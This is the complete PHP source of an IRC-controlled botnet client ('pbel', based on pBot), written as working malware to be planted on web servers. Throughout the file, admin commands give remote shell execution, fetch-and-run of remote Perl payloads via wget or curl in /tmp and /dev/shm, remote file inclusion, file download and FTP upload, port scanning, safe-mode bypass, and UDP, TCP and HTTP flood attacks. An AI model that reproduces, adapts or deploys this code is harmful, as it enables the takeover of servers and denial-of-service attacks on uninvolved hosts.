<? 

	/****************************************************/
	/* pbel - by s0										*/
	/* credits: the original author of pbot ( ? )		*/
	/****************************************************/


	set_time_limit( 0 );
	error_reporting( 0 );
	echo "Success!";

	class pBot 
	{
		var $using_encode = true;
		
		var $config = array(
			'server' 	=> 'MTI3LjAuMC4x',	//server here (base64)
			'port'		=> 6667,
			'chan'		=> 'bGF6eQ==',		//channel here (base64) DO NOT USE "#", "#lazy" = "lazy"
			'key'		=> '',
			'nickform'	=> 'SLOTH[%d]',
			'identp'	=> 'ez',
			'modes'		=> '+p',
			'maxrand'	=> 6,
			'cprefix'	=> '.',
			'host'		=> '*'
		);

		var $admins = array
		( 
			's0beit' => '098f6bcd4621d373cade4e832627b4f6' // pass = "test"
			//passes are MD5 format, you can also have multiple admins
		);
		
		function auth_host( $nick, $password, $host )
		{
			$admin_count = count( $this->admins );
			if( $admin_count > 0 )
			{
				$mpass = md5( $password );
				if( $this->admins[ $nick ] == $mpass )
				{
					$this->users[ $host ] = true;
				}
			}
			else
			{
				$this->users[ $host ] = true;
			}
		}
		
		function is_authed( $host )
		{
			return isset( $this->users[ $host ] );
		}
		
		function remove_auth( $host )
		{
			unset( $this->users[ $host ] );
		}
		
		function ex( $cfe )
		{
			$res = '';
			if (!empty($cfe))
			{
				if(function_exists('class_exists') && class_exists('Perl'))
				{
					$perl = new Perl();
					$perl->eval( "system('$cfe');" );
				}
				if(function_exists('exec'))
				{
					@exec($cfe,$res);
					$res = join("\n",$res);
				}
				elseif(function_exists('shell_exec'))
				{
					$res = @shell_exec($cfe);
				}
				elseif(function_exists('system'))
				{
					@ob_start();
					@system($cfe);
					$res = @ob_get_contents();
					@ob_end_clean();
				}
				elseif(function_exists('passthru'))
				{
					@ob_start();
					@passthru($cfe);
					$res = @ob_get_contents();
					@ob_end_clean();
				}
				elseif(function_exists('proc_open'))
				{
					$res = proc_open($cfe);
				}
				elseif(@is_resource($f = @popen($cfe,"r")))
				{
					$res = "";
					while(!@feof($f)) { $res .= @fread($f,1024); }
					@pclose($f);
				}
			}
			return $res;
		}
		
		function is_safe( )
		{
			if( ( @eregi( "uid", $this->ex( "id" ) ) ) || ( @eregi( "Windows", $this->ex( "net start" ) ) ) )
			{
				return 0;
			}
			return 1;
		}
		
		function get_chan( )
		{
			if( $this->using_encode )
			{
				return '#'.base64_decode( $this->config[ 'chan' ] );
			}
			else
			{
				return '#'.$this->config[ 'chan' ];
			}
		}
		
		function start() 
		{
			if( $this->using_encode )
			{
				if(!($this->conn = fsockopen(base64_decode($this->config['server']),$this->config['port'],$e,$s,30))) 
				{
					$this->start(); 
				}
			}
			else
			{
				if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
				{
					$this->start(); 
				}
			}
				
			$ident = $this->config['prefix'];
			$alph = range("0","9");
			for( $i=0; $i < $this->config['maxrand']; $i++ )
			{
				$ident .= $alph[rand(0,9)];
			}
				
			if( strlen( $this->config[ 'pass' ] ) > 0 )
			{
				$this->send( "PASS ".$this->config[ 'pass' ] );
			}
				
			$this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
			$this->set_nick( );
			$this->main( );
		}

		function main() 
		{ 
			while(!feof($this->conn)) 
			{ 
				$this->buf = trim(fgets($this->conn,512)); 
				$cmd = explode(" ",$this->buf); 
				if(substr($this->buf,0,6)=="PING :") 
				{ 
					$this->send("PONG :".substr($this->buf,6)); 
				} 
				if(isset($cmd[1]) && $cmd[1] =="001") 
				{ 
					$this->send("MODE ".$this->nick." ".$this->config['modes']); 
					
					if( $this->using_encode )
					{
						$this->join($this->get_chan( ),base64_decode($this->config['key']));
					}
					else
					{
						$this->join($this->get_chan( ),$this->config['key']);
					}
					
					if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
					else { $safemode = "off"; }
					$uname = php_uname(); 
				} 
				if(isset($cmd[1]) && $cmd[1]=="433") 
				{ 
					$this->set_nick(); 
				} 
				if($this->buf != $old_buf) 
				{ 
					$mcmd = array(); 
					$msg = substr(strstr($this->buf," :"),2); 
					$msgcmd = explode(" ",$msg); 
					$nick = explode("!",$cmd[0]); 
					$vhost = explode("@",$nick[1]); 
					$vhost = $vhost[1]; 
					$nick = substr($nick[0],1); 
					$host = $cmd[0]; 
					if($msgcmd[0]==$this->nick) 
					{ 
						for($i=0;$i<count($msgcmd);$i++) 
							$mcmd[$i] = $msgcmd[$i+1]; 
					} 
					else 
					{ 
						for($i=0;$i<count($msgcmd);$i++) 
							$mcmd[$i] = $msgcmd[$i]; 
					} 
					if(count($cmd)>2) 
					{ 
						switch($cmd[1]) 
						{ 
							case "QUIT":
							{
								if( $this->is_authed( $host ) )
								{
									$this->remove_auth( $host );
								}
							}
							break; 
							case "PART": 
							{
								if( $this->is_authed( $host ) )
								{
									$this->remove_auth( $host );
								}
							}
							break; 
							case "PRIVMSG": 
								if( ( substr($mcmd[0],0,1) == $this->config[ 'cprefix' ] ) ) 
								{ 
									if( $this->is_authed( $host ) == false )
									{
										switch( substr( $mcmd[ 0 ], 1 ) )
										{
											case "auth":
											{
												$this->auth_host( $nick, $mcmd[ 1 ], $host );
												if( $this->is_authed( $host ) )
												{
													$this->privmsg( $this->get_chan( ), "[ auth ] Successful login from [ ".$nick." ]" );
												}
												else
												{
													$this->privmsg( $this->get_chan( ), "[ auth ] Failed attempt from [ ".$nick." ]" );
												}
												break;
											}
										}
									}
									else
									{
										switch(substr($mcmd[0],1)) 
										{
											case "exec":
											{
												if( !$this->is_safe( ) )
												{
													$command = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );
													$returndata = $this->ex( $command );
													if( !empty( $returndata ) )
													{
														$this->privmsg( $this->get_chan( ), '[ exec ] '.$returndata );
													}
												}
												break;
											}
											case "info":
											{
												$safemode = "on";
												if( !$this->is_safe( ) )
												{
													$safemode = "off";
												}
												$this->privmsg( $this->get_chan( ), '[ info ] '.php_uname( ).' ( SAFE: '.$safemode.' )' );
												break;
											}
											case "safe":
											{
												$safemode = "on";
												if( !$this->is_safe( ) )
												{
													$safemode = "off";
												}
												$this->privmsg( $this->get_chan( ), '[ safe ] '.$safemode );
												break;
											}
											case "uname":
											{
												$this->privmsg( $this->get_chan( ), '[ uname ] '.php_uname( ) );
												break;
											}
											case "dropperl":
											{
												if( $this->is_safe( ) )
												{
													$this->privmsg( $this->get_chan( ), '[ dropperl ] Safe mode is ON' );
													break;
												}
												
												$perl_file = $mcmd[1];
												
												if( !empty( $perl_file ) )
												{
													$parsed_url = $this->parse_url_s( $perl_file );
													
													$new_remote = $parsed_url[ 'scheme' ].'://'.$parsed_url[ 'host' ].$parsed_url[ 'dir' ].'/';
													$new_local 	= $parsed_url[ 'file' ];
													$file_type	= $parsed_url[ 'file_ext' ];
													
													$this->ex('cd /tmp;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /tmp;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /tmp;lwp-download '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /tmp;lynx -source '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /dev/shm;wget '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /dev/shm;curl -O '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /dev/shm;lwp-download '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /dev/shm;lynx -source '.$new_remote.$new_local.';perl '.$new_local.';rm -rf *'.$file_type.'*');
													$this->ex('cd /tmp;rm -rf *'.$file_type.'**');
													$this->ex('cd /dev/shm;rm -rf *'.$file_type.'**');
													
													$this->privmsg( $this->get_chan( ), '[ execrfi ] Executed file '.$new_remote.$new_local );
													break;
												}
												
												$this->privmsg( $this->get_chan( ), '[ execrfi ] Failure executing '.$perl_file );
												break;
											}
											case "ip":
											{
												$this->privmsg( $this->get_chan( ), '[ ip ] '.$_SERVER['SERVER_ADDR'] );
												break;
											}
											case "execrfi":
											{
												$fileUrl = $mcmd[1];
												
												if( !empty( $fileUrl ) )
												{
													$urli = parse_url( $fileUrl );
													
													if( !empty( $urli['host'] ) && !empty( $urli['path'] ) && !empty( $urli['query'] ) )
													{
														$fp = fsockopen( $urli['host'], 80, $errno, $errstr, 5 );
														
														if( $fp )
														{
															$out = "GET /".$urli['path'].$urli['query']." HTTP/1.1\r\n";
															$out .= "Host: ".$urli['host']."\r\n";
															$out .= "Keep-Alive: 300\r\n";
															$out .= "Connection: keep-alive\r\n\r\n";
															fwrite( $fp, $out );
															
															$get_data = '';
															
															while(!feof($fp))
															{ $get_data .= fgets( $fp, 256 ); }
															
															$this->privmsg( $this->get_chan( ), '[ execrfi ] Executed file '.$fileUrl );
															break;
														}
													}
												}
												
												$this->privmsg( $this->get_chan( ), '[ execrfi ] Failure executing '.$fileUrl );
												break;
											}
											case "base64":
											{
												$str_ed = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );
												switch( $mcmd[1] )
												{
													case "encode":
													{
														$this->privmsg( $this->get_chan( ), "[ base64 ] encode [ '".$str_ed."' -> '".base64_encode($str_ed)."' ]" );
														break;
													}
													case "decode":
													{
														$this->privmsg( $this->get_chan( ), "[ base64 ] decode [ '".$str_ed."' -> '".base64_decode($str_ed)."' ]" );
														break;
													}
												}
												break;
											}
											case "md5":
											{
												$str_md5 = substr( strstr( $msg, $mcmd[0] ), strlen( $mcmd[0] ) + 1 );
												$this->privmsg( $this->get_chan( ), "[ md5 ] [ '".$str_md5."' -> '".md5($str_md5)."' ]" );
												break;
											}
											case "dns":
											{
												if(isset($mcmd[1])) 
                               					{
                                  					$ip = explode(".",$mcmd[1]); 
                                  					if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) 
														&& is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  					{
                                     					$this->privmsg($this->get_chan( ),"[ dns ]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  					}
                                  					else 
                                  					{
                                     					$this->privmsg($this->get_chan( ),"[ dns ]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  					}
                               					}
												break;
											}
											case "exit":
											{
												fclose( $this->conn );
												exit( );
												break;
											}
											case "restart":
											{
												$this->privmsg( $this->get_chan( ), "[ restart ] executed by [".$nick."]" );
												$this->send( "QUIT :restart command from ".$nick );
												fclose( $this->conn );
												$this->start();
												break;
											}
											case "breaksafe":
											{
												if( $this->is_safe( ) )
												{
													ini_restore( "safe_mode" );
													ini_restore( "open_basedir" );
												}
												
												$safemode = "on";
												if( !$this->is_safe( ) )
												{
													$safemode = "off";
													$this->set_nick();
												}
												$this->privmsg( $this->get_chan( ), '[ safe ] '.$safemode );
											}
											case "moveserver":
											{
												if( count( $mcmd ) > 3 )
												{
													$server = $mcmd[1];
													$port = $mcmd[2];
													$channel = $mcmd[3];
													$key = $mcmd[4];
													
													if( $this->using_encode )
													{
														$this->config[ 'server' ] = base64_encode( $server );
														$this->config[ 'chan' ] = base64_encode( str_replace( "#", "", $channel ) );
														$this->config[ 'key' ] = base64_encode( $key );
													}
													else
													{
														$this->config[ 'server' ] = $server;
														$this->config[ 'chan' ] = str_replace( "#", "", $channel );
														$this->config[ 'key' ] = $key;
													}
													
													$this->config[ 'port' ] = $port;
													$this->privmsg( $this->get_chan( ), "[ moveserver ] ".$server." => ".$port." => ".$channel." => ".$key );
													$this->send( "QUIT :moveserver command from ".$nick );
													
													fclose( $this->conn );
													$this->start();
												}
												break;
											}
											case "whois":
											{
												$param2 = $mcmd[1];
												
												if( !empty( $param2 ) )
												{
													//do it
													//http://ws.arin.net/whois/?queryinput=127.0.0.1
													$fp = fsockopen( "ws.arin.net", 80, $errno, $errstr, 30 );
													
													if( $fp )
													{
														$out = "GET /whois/?queryinput=$param2 HTTP/1.1\r\n";
														$out .= "Host: ws.arin.net\r\n";
														$out .= "Keep-Alive: 300\r\n";
														$out .= "Connection: keep-alive\r\n\r\n";
														fwrite( $fp, $out );
	
														$whodata = '';
														while(!feof($fp))
														{
															/*do nothing*/
															$whodata .= fread( $fp, 1024 );
														}
														
														$explk = explode( "<div id=\"content\">", $whodata );
														$explk = explode( "</div>", $explk[1] );
														$htmldat = strip_tags( $explk[0] );

														fclose( $fp );
														
														$this->privmsg( $this->get_chan( ), "[ whois ] $htmldat" );

													}else{
														$this->privmsg( $this->get_chan( ), "[ whois ] Error: $errstr" );
													}
												}
												else
												{
													$this->privmsg( $this->get_chan( ), "[ whois ] Invalid params, use .whois <ip/host>" );
												}
												break;
											}
											case "upftp":
											{
												//ftp://user:password@host.com
												$pftp = parse_url( $mcmd[1] );
												$file = $mcmd[2];
												$dest = $mcmd[3];
												
												if( empty( $pftp[ 'host' ] )
													|| empty( $pftp[ 'user' ] )
													|| empty( $pftp[ 'pass' ] )
													|| empty( $file )
													|| empty( $dest ) )
												{
													$this->privmsg( $this->get_chan( ), "[ upftp ] URL line invalid!" );
												}
												else
												{
													$conn_id = ftp_connect( $pftp[ 'host' ] );
													$login_result = ftp_login( $conn_id, $pftp[ 'user' ], $pftp[ 'pass' ] );
													
													if( ( !$conn_id ) || ( !$login_result ) ) 
													{
														$this->privmsg( $this->get_chan( ), "[ upftp ] FTP connection failed!" );
													}
													else
													{
														$this->privmsg( $this->get_chan( ), "[ upftp ] Connected to ".$pftp[ 'host' ]." for user ".$pftp[ 'user' ] );
														$upload = ftp_put( $conn_id, $dest, $file, FTP_BINARY );
														if( !$upload )
														{
															$this->privmsg( $this->get_chan( ), "[ upftp ] FTP upload faled!" );
														}
														else
														{
															$this->privmsg( $this->get_chan( ), "[ upftp ] FTP upload success!" );
															$this->privmsg( $this->get_chan( ), "[ upftp ] Uploaded '".$file."' to '".$dest."'" );
														}
													}
												}
												break;
											}
											case "joinchan":
											{
												$channel = $mcmd[1];
												$key = $mcmd[2];
												$this->privmsg( $this->get_chan( ), "[ joinchan ] ".$channel." => ".$key );
												$this->join( $channel, $key );
												break;
											}
											case "partchan":
											{
												$this->privmsg( $this->get_chan( ), "[ partchan ] ".$mcmd[1] );
												$this->send( "PART ".$mcmd[1] );
											}
											case "getvuln":
											{
												$server_name = $_SERVER['SERVER_NAME'];
												$req_uri = $_SERVER['REQUEST_URI'];
												
												if( $server_name != "localhost" && $server_name != "127.0.0.1" )
												{
													if( strlen( $server_name ) && strlen( $req_uri ) )
													{
														$vuln = "http://".$server_name.$req_uri;
														$this->privmsg( $this->get_chan( ), "[ getvuln ] ".$vuln );
													}
												}
												break;
											}
											case "download":
											{
												if( count( $mcmd ) > 2 )
												{
													if( !$fp = fopen( $mcmd[ 2 ], "w" ) )
													{
														$this->privmsg( $this->get_chan( ), "[ download ] Permission denied!" );
													}
													else
													{
														if( !$get = file( $mcmd[ 1 ] ) )
														{
															$this->privmsg( $this->get_chan( ), "[ download ] Download failed!" );
														}
														else
														{
															for( $i=0; $i <= count( $get ); $i++ ) 
															{ 
																fwrite( $fp, $get[ $i ] ); 
															}
															$this->privmsg( $this->get_chan( ),"[ download ] URL [".$mcmd[ 1 ]."] to [".$mcmd[ 2 ]."]");
														}

														fclose( $fp );
													}
												}
												else
												{
													$this->privmsg( $this->get_chan( ), "[ download ] Invalid Parameters, idiot!" );
												}
												break;
											}
											case "pmsg":
											{
												$person = $mcmd[1];
												$text = substr( strstr( $msg, $mcmd[1] ), strlen( $mcmd[1] ) + 1 );
												$this->privmsg( $this->get_chan( ), "[ pmsg ] ".$person." => ".$text );
												$this->privmsg( $person, $text );
												break;
											}
											case "pscan":
											{
												$host = $mcmd[1];
												$beginport = $mcmd[2];
												$endport = $mcmd[3];
												$open_ports = "Open Port List for ".$host.": ";
												
												for($i = $beginport; $i < $endport; $i++)
												{
													if( $this->scanport( $host, $i ) )
													{
														$open_ports .= "|".$i;
													}
												}
												
												$this->privmsg( $this->get_chan( ), $open_ports );
												break;
											}
											case "software":
											{
												$this->privmsg( $this->get_chan( ), $_SERVER[ 'SERVER_SOFTWARE' ] );
												break;
											}
											case "snf":
											{
												$this->config[ 'nickform' ] = $mcmd[ 1 ];
												$this->privmsg( $this->get_chan( ), "Nickname format set to [ ".$mcmd[ 1 ]." ]" );
												break;
											}
											case "randnick":
											{
												$this->set_nick();
												break;
											}
											case "unauth":
											{
												$this->remove_auth( $host );
												$this->privmsg( $this->get_chan( ), "[ auth ] Logout [ ".$nick." ]" );
												break;
											}
											case "urlbomb":
											{
												$this->urlbomb( $mcmd[ 1 ], $mcmd[ 2 ], $mcmd[ 3 ] );
												break;
											}
                            				case "udpflood": 
											{
                               					if( count( $mcmd ) > 3 ) 
                               					{
                                  					$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               					} 
                            					break; 
											}
                            				case "tcpflood": 
											{
                               					if( count( $mcmd ) > 5 ) 
                               					{ 
                                 					$this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               					} 
                            					break; 
											}
										} 
									}
								} 
							break; 
						} 
					} 
				} 
				$old_buf = $this->buf; 
			} 
			$this->start(); 
		}
		
		function scanport( $host, $port )
		{
			if( fsockopen( $host, $port, $e, $s ) )
			{
				return 1;
			}
			return 0;
		}
		
		function urlbomb( $host, $path, $times, $mode = 0 )
		{
			if( !isset( $host ) || !isset( $path ) || !isset( $times ) )
				return;
			
			$this->privmsg( $this->get_chan( ), '[ urlbomb ] started! [ '.$host.'/'.$path.' ]' );
			
			$success = 0;
			for( $i = 0; $i < $times; $i++ )
			{
				$fp = fsockopen( $host, 80, $errno, $errstr, 30 );
				if( $fp )
				{
					$out = "GET /".$path." HTTP/1.1\r\n";
					$out .= "Host: ".$host."\r\n";
					$out .= "Keep-Alive: 300\r\n";
					$out .= "Connection: keep-alive\r\n\r\n";
					fwrite( $fp, $out );

					if( $mode != 0 )
					{
						while(!feof($fp)){/*do nothing*/}
					}
					
					fclose( $fp );
					
					$success++;
				}
			}

			$this->privmsg( $this->get_chan( ), '[ urlbomb ] finished! [ '.$host.'/'.$path.' ][ success: '.$success.' ]' );
		}
		
		function udpflood( $host, $packetsize, $time ) 
		{
			$this->privmsg( $this->get_chan( ),"[ udpflood ] Started [".$host."]" ); 
			$packet = "";
			for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
			$timei = time();
			$i = 0;
			while(time()-$timei < $time) 
			{
				$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
				fwrite($fp,$packet);
				fclose($fp);
				$i++;
			}
			$env = $i * $packetsize;
			$env = $env / 1048576;
			$vel = $env / $time;
			$vel = round($vel);
			$env = round($env);
			$this->privmsg( $this->get_chan( ),"[ udpflood ] $env MB Sent / $vel MB/s ");
		}
		
		function tcpflood($host,$packets,$packetsize,$port,$delay) 
		{ 
			$this->privmsg( $this->get_chan( ),"[\2TcpFlood Started!\2]"); 
			$packet = ""; 
			for($i=0;$i<$packetsize;$i++) 
				$packet .= chr(mt_rand(1,256)); 
			
			for($i=0;$i<$packets;$i++) 
			{ 
				if(!$fp=fsockopen("tcp://".$host,$port,$e,$s,5)) 
			  	{ 
					$this->privmsg( $this->get_chan( ),"[\2TcpFlood\2]: Error: <$e>"); 
				  	return 0; 
			   	} 
			   	else 
			   	{ 
					fwrite($fp,$packet); 
					fclose($fp); 
				} 
			   	sleep($delay); 
			} 
			$this->privmsg( $this->get_chan( ),"[\2TcpFlood Finished!\2]: Config - $packets for $host:$port."); 
		}
		
		function send($msg) 
		{ 
			fwrite($this->conn,"$msg\r\n"); 
		} 
		
		function join($chan,$key=NULL) 
		{ 
			$this->send("JOIN $chan $key"); 
		} 
		
		function privmsg($to,$msg)
		{
			$this->send("PRIVMSG $to :$msg");
		}
		
		function notice($to,$msg)
		{
			$this->send("NOTICE $to :$msg");
		}
		 
		 function set_nick() 
		 { 
			$prefix = "[C]";
			if(isset($_SERVER['SERVER_SOFTWARE']))
			{ 
				if( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), "apache" ) )
					$prefix = "[A]"; 
				elseif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), "iis" ) ) 
					$prefix = "[I]"; 
				elseif( strstr( strtolower( $_SERVER[ 'SERVER_SOFTWARE' ] ), "xitami" ) ) 
					$prefix = "[X]"; 
				else 
					$prefix = "[U]"; 
			}
			
			if( !$this->is_safe( ) )
			{
				$prefix .= "[S]";
			}
	
			$random_number = "";
			for( $i = 0; $i < $this->config[ 'maxrand' ]; $i++ )
			{
				$random_number .= mt_rand( 0, 9 ); 
			}
	
			$this->nick = sprintf( $prefix.$this->config[ 'nickform' ], $random_number );
			$this->send("NICK ".$this->nick);
		 }
		 
		function parse_url_s( $url )
		{
			$URLpcs = ( parse_url( $url ) );
			$PathPcs = explode( "/", $URLpcs['path'] );
			$URLpcs['file'] = end( $PathPcs );
			unset( $PathPcs[ key( $PathPcs ) ] );
			$URLpcs['dir'] = implode("/",$PathPcs);
			
			$fileext = explode( '.', $URLpcs['file'] );
			
			if(count($fileext))
			{
				$URLpcs['file_ext'] = $fileext[ count( $fileext ) - 1 ];
			}
			
			return ($URLpcs);
		}
	} 
	
	$bot = new pBot; 
	$bot->start(); 

?>